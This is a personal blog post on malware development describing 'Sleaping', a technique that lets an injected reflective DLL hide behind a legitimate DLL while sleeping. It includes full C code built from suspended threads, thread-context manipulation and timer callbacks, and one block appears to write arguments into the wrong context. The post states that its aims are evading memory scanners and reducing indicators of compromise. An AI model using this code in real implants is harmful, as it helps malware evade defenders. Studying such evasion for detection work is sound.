# https://oldboy21.github.io/posts/2024/06/sleaping-issues-swappala-and-reflective-dll-friends-forever/

9 minutes

# [SLE(A)PING Issues: SWAPPALA and Reflective DLL Friends Forever](https://oldboy21.github.io/posts/2024/06/sleaping-issues-swappala-and-reflective-dll-friends-forever/)

Here we go again, hello everyone! Sorry I am on a roll this period, can’t really sle(a)p well when I have something still to solve and I had some leftovers from the previous [SWAPPALA](https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/) adventure.

What we going to talk about today?

Well, lots of failures but with a bright end after all.

As mentioned in the last episode I wanted to grant the Reflective DLL I worked on with [SWAPPALA](https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/) super powers. Wrapping up SWAPPALA was only the beginning while I thought I was way closer to a stable solution.

## SWAPPALA Recap

TL,DR; Even if reading my bello blog about [SWAPPALA](https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/) will make your day better, if you do not want or do not have time:

SWAPPALA makes use of HWBP tricks to map a malicious private section at the same address of a legit DLL. Once the nasty stuff is done, SWAPPALA re-map the legit DLL at its very own address and then goes to sleep with EkkoQua.

What is [EkkoQua](https://github.com/oldboy21/SWAPPALA/blob/main/SWAPPALA/swappala.h)? It is a slightly modified version of Ekko that use some stack shenanigans in order to avoid the so-called “bytes fights” on the stack and queue for execution also Win32 APIs that take more than 4 arguments.

Cool, really brief description of SWAPPALA, please refer also to the repository.

## The Goal

The idea was to grant the [Reflective DLL I built](https://github.com/oldboy21/RflDllOb) with SWAPPALA super nap powers.

Again bit of context if you do not want to read [my blog](https://oldboy21.github.io/posts/2023/12/all-i-want-for-christmas-is-reflective-dll-injection/) about Reflective DLL: This magic DLL is able to load itself in memory. It exports a PIC functions that find the DLL in memory and executes all the loading operations. Crazy stuff.

Granting SWAPPALA nap powers to the Reflective DLL basically meant that the Reflective DLL once loaded in memory it would hide itself behind a legit DLL, using SWAPPALA.

## And Then What Happened?

Unfortunately copy pasta SWAPPALA into Reflective DLL code did not work right away. After years in IT a little part of me still hopes that new code would work right away, but it’s never the case. First reaction of Reflective DLL to SWAPPALA was really harsh → crashing Notepad.exe

![animated](https://media0.giphy.com/media/14ceV8wMLIGO6Q/giphy.gif?cid=7941fdc6g8l53q9d6vojfo9v7edj9ldzp5p4qmmxjv2evzaa&ep=v1_gifs_search&rid=giphy.gif&ct=g)

That was happening because some of the ROP chain functions were not executing properly so the main thread was coming back from sleep into an unexisting section in memory, very scary.

A bullet list that matters more than thousands words:

- Unmap Malicious Section → Good
- Remap Legit DLL → Failing
- Sleep → ZZzzzZzz
- Unmap Legit DLL → Good
- Remap Malicious Section → Failing
- BOOMBOROMBOOMB

But why those were failing? They were working fine in the code of SWAPPALA after all. Depressing, it makes you start doubting about everything even choices made years ago.

Jokes aside, it took me some debugging to understand that those functions were not actually failing, they were never executed.

![animated](https://media2.giphy.com/media/LRgZHbEpQvHEi8PID6/giphy.gif?cid=7941fdc6kwlubnnwo10ep7hdy58ufidrl75zjuljn1q517to&ep=v1_gifs_search&rid=giphy.gif&ct=g)

Breakpoints on “MapViewOffileEx” were never hit while all the other functions were executed properly. So something was happening before even getting to the point of execution of those functions. It did not take a genius that was something that had to do with my EkkoQua implementation. Duplicating the stack in order to be able to work with functions that takes more than 4 arguments was definitely the trigger for this annoying behaviour. Ok so then I did my homework with x64dbg and set a breakpoint on the “NtContinue” instead and:

![](https://oldboy21.github.io/sleaping/Untitled.png)

Ehehe, must admit I am not great at reverse engineering but the only thing I noticed was that after the NtContinue, after not so many instructions, the thread was being killed without causing too much noises. Alright, not many conclusions out of that.

Turns out that the stack duplication thing that I had implemented in EkkoQua was really considered bad by all the process that are compiled with security protections, including CFG, Shadow Stack, Stack Cookie etc. etc.

Really haven’t thought of something like that, however it was interesting to read how all of those are implemented and how, despite being implemented to protect against different kind of attacks, they would get pissed at SWAPPALA and EkkoQua. Since the amount of lines of C I had dealt with were not enough (and with bello help from ChatGPT) I came up with this:

![](https://oldboy21.github.io/sleaping/Untitled%201.png)

A bello script that would tell me all the running processes that had no security protections enabled. Injecting Reflective DLL + SWAPPALA in those process was working just fine.

It felt good because it made sense, it felt really bad because I still did not know how to solve it.

I honestly tried to figure what exactly was the problem but it was kinda challenging, still I think the Stack Cookie check was failing and the thread killed, I do not know, could not prove it, got annoyed.

![](https://oldboy21.github.io/sleaping/Untitled.jpeg)

It felt like it wasn’t the right way to approach this anyway and I started switching my mind on different ideas, among which setting HWBP on the worker threads registries in order to set the arguments of the MapViewOfFileEx by hooking the functions and working my way around that in the vectored exception handler. Bad idea once i discovered that NtContinue ignores debug registers

![animated](https://media1.giphy.com/media/1FMaabePDEfgk/giphy.gif?cid=7941fdc6uk3xaomchtzi738auplxy1bkl5r2bnsaon951a61&ep=v1_gifs_search&rid=giphy.gif&ct=g)

Ok so, let’s take a breath and start over.

## Sleaping

Ok it was about time to drop the idea of adapting existing techniques to achieve my goals, so I deleted EkkoQua and started with an empty function called Sleaping.

What do I want?

Threads with different stack! In a suspended state 👀

```c
    // Create threads in a suspended state
    ThreadArray[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[0] == NULL) {

        return -1;
    }
    ThreadArray[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[1] == NULL) {

        return -1;
    }
    ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[2] == NULL) {

        return -1;
    }
    ThreadArray[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[3] == NULL) {

        return -1;
    }
```

C

How do I want to execute them?

Well, I like the idea of having a timer and NtContinue is not the only function that can be used to (re)start a thread, also these above are in a suspended state. ResumeThread to the rescue!

```c
ResumeThreadAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ResumeThread");

if (ResumeThreadAddress != NULL) {
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[0], 100, 0, WT_EXECUTEINTIMERTHREAD);//unamp
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[1], 200, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[2], 7000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
    CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[3], 7100, 0, WT_EXECUTEINTIMERTHREAD);//mapmal

    WaitForMultipleObjects(4, ThreadArray, TRUE, INFINITE);
}
```

C

And how do I want to tell threads what to do?

Context Matters, even for sle(a)ping:

```c
    CONTEXT* context = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextB = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextC = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextD = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    HANDLE ThreadArray[4] = { NULL };

    context->ContextFlags = CONTEXT_ALL;
    contextB->ContextFlags = CONTEXT_ALL;
    contextC->ContextFlags = CONTEXT_ALL;
    contextD->ContextFlags = CONTEXT_ALL;

    [...]

    GetThreadContext(ThreadArray[0], context);//unmap
    GetThreadContext(ThreadArray[1], contextB);//mapex
    GetThreadContext(ThreadArray[2], contextC);//unmap
    GetThreadContext(ThreadArray[3], contextD);//mapex

    //exit gracefully
    *(ULONG_PTR*)((*context).Rsp) = (DWORD64)ExitThread;
    (*context).Rip = (DWORD64)UnmapViewOfFile;
    (*context).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextB).Rsp) = (DWORD64)ExitThread;
    (*contextB).Rip = (DWORD64)MapViewOfFileEx;
    (*contextB).Rcx = (DWORD64)sacDllHandle;
    (*contextB).Rdx = FILE_MAP_ALL_ACCESS;
    (*contextB).R8 = (DWORD64)0x00;
    (*contextB).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

    *(ULONG_PTR*)((*contextC).Rsp) = (DWORD64)ExitThread;
    (*contextC).Rip = (DWORD64)UnmapViewOfFile;
    (*contextC).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextD).Rsp) = (DWORD64)ExitThread;
    (*contextD).Rip = (DWORD64)MapViewOfFileEx;
    (*contextD).Rcx = (DWORD64)malDllHandle;
    (*contextD).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
    (*contextD).R8 = (DWORD64)0x00;
    (*contextD).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

    SetThreadContext(ThreadArray[0], context);
    SetThreadContext(ThreadArray[1], contextB);
    SetThreadContext(ThreadArray[2], contextC);
    SetThreadContext(ThreadArray[3], contextD);
```

C

Bellissimo, an important thing to notice here and to point out: the way I set the arguments in the context of the threads is very similar to what I did in EkkoQua, except for one thing.

As you can see the RSP pointer is set to ExitThread function address, why?

If you take a look the stack of a thread created in suspended state you will notice that it’s allocated but it’s all zeros. ☠️

So what happens? Well the thread will execute the function but when it will try to go to the return address it will fall into a very big ACCESS VIOLATION EXCEPTION. Since we want to sle(a)p well at night we exit the threads using ExitThread.

Well, that’s it, now full code, test run and some screenshots!

```c
int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize) {


    CONTEXT* context = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextB = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextC = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextD = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    HANDLE ThreadArray[4] = { NULL };

    context->ContextFlags = CONTEXT_ALL;
    contextB->ContextFlags = CONTEXT_ALL;
    contextC->ContextFlags = CONTEXT_ALL;
    contextD->ContextFlags = CONTEXT_ALL;

    // Create a thread to control
    ThreadArray[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[0] == NULL) {

        return -1;
    }
    ThreadArray[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[1] == NULL) {

        return -1;
    }
    ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[2] == NULL) {

        return -1;
    }
    ThreadArray[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[3] == NULL) {

        return -1;
    }

    GetThreadContext(ThreadArray[0], context);//unmap
    GetThreadContext(ThreadArray[1], contextB);//mapex
    GetThreadContext(ThreadArray[2], contextC);//unmap
    GetThreadContext(ThreadArray[3], contextD);//mapex

    *(ULONG_PTR*)((*context).Rsp) = (DWORD64)ExitThread;
    (*context).Rip = (DWORD64)UnmapViewOfFile;
    (*context).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextB).Rsp) = (DWORD64)ExitThread;
    (*contextB).Rip = (DWORD64)MapViewOfFileEx;
    (*contextB).Rcx = (DWORD64)sacDllHandle;
    (*contextB).Rdx = FILE_MAP_ALL_ACCESS;
    (*contextB).R8 = (DWORD64)0x00;
    (*contextB).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

    *(ULONG_PTR*)((*contextC).Rsp) = (DWORD64)ExitThread;
    (*contextC).Rip = (DWORD64)UnmapViewOfFile;
    (*contextC).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextD).Rsp) = (DWORD64)ExitThread;
    (*contextD).Rip = (DWORD64)MapViewOfFileEx;
    (*contextD).Rcx = (DWORD64)malDllHandle;
    (*contextD).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
    (*contextD).R8 = (DWORD64)0x00;
    (*contextD).R9 = (DWORD64)0x00;
    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

    SetThreadContext(ThreadArray[0], context);
    SetThreadContext(ThreadArray[1], contextB);
    SetThreadContext(ThreadArray[2], contextC);
    SetThreadContext(ThreadArray[3], contextD);

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;
    PVOID ResumeThreadAddress = NULL;

    hTimerQueue = CreateTimerQueue();

    ResumeThreadAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ResumeThread");

    if (ResumeThreadAddress != NULL) {
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[0], 100, 0, WT_EXECUTEINTIMERTHREAD);//unamp
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[1], 200, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[2], 7000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[3], 7100, 0, WT_EXECUTEINTIMERTHREAD);//mapmal

        WaitForMultipleObjects(4, ThreadArray, TRUE, INFINITE);
    }

    return 0;

}
```

C

Ah almost forgot, bonus point: “ResumeThread” does not need to be whitelisted in CFG, one less IOC 🙂

## Demo Time

![](https://oldboy21.github.io/sleaping/Untitled%202.png)

Che bello it was tough to take this screenshot. We all know how SWAPPALA reacts to memory scanners so we keep it like this for today.

## Conclusions and Credits

We can say new in-memory sleeping technique? Maybe just different, as you wish, I hope you had fun reading this blog and learned something. Some take aways:

- It works with SWAPPALA, Reflective DLL hide itself in memory in a remote process
- It is different, and we know how much that matters nowadays
- “”ResumeThread” does not seem to be one of those functions that needs to be add in the Control Flow Guard list (i forgot it and it did not crash). So one less IOC
- Each thread has its own stack, no fights anymore for more than 4 arguments

Guess that’s it? Pretty far from perfect I would say so please do reach out to me if you have any ideas or just want to talk about it.

Thanks to whoever post code and resources online, Mal Dev Academy, Sektor7, open source community, Ekko, Pillo and all the people that helps brainstorming, you are golden <3

* * *

[untagged](https://oldboy21.github.io/tags/untagged/)

1887 Words

2024-06-04 17:34

* * *

[Share on facebook](https://facebook.com/sharer/sharer.php?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f "Share on facebook")[Share on twitter](https://twitter.com/intent/tweet/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f "Share on twitter")[Share on tumblr](https://www.tumblr.com/widgets/share/tool?posttype=link&title=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&caption=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&canonicalUrl=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f "Share on tumblr")[Share via email](mailto:?subject=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&body=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f "Share via email")[Share on pinterest](https://pinterest.com/pin/create/button/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f&media=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f;description=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever "Share on pinterest")[Share on linkedin](https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f&title=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&summary=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&source=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f "Share on linkedin")[Share on reddit](https://reddit.com/submit/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f&resubmit=true&title=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever "Share on reddit")[Share on xing](https://www.xing.com/app/user?op=share;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f;title=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever "Share on xing")[Share on whatsapp](whatsapp://send?text=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever%20https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f "Share on whatsapp")[Share on hacker news](https://news.ycombinator.com/submitlink?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f&t=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever "Share on hacker news")[Share on telegram](https://telegram.me/share/url?text=SLE%28A%29PING%20Issues%3a%20SWAPPALA%20and%20Reflective%20DLL%20Friends%20Forever&url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f06%2fsleaping-issues-swappala-and-reflective-dll-friends-forever%2f "Share on telegram")

[←Timer Callbacks Spoofing to Improve your SLEAP and SWAPPALA Untold](https://oldboy21.github.io/posts/2024/09/timer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold/)[SWAPPALA: Why Change When You Can Hide?→](https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/)